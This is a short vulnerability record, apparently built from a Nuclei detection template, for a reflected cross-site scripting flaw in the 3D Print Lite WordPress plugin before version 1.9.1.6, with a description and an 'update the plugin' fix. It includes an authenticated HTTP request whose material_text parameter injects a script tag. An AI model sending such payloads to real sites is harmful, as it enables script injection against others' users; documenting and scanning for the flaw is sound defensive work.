# Vulnerability: 3D Print Lite < 1.9.1.6 - Reflected Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`3d-print-lite-xss.yaml`)

## Description
The plugin does not sanitise and escape some user input before outputting it back in attributes, leading to Reflected Cross-Site Scripting issues

## Secure Mitigation
Update to plugin version 1.9.1.6 or latest

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

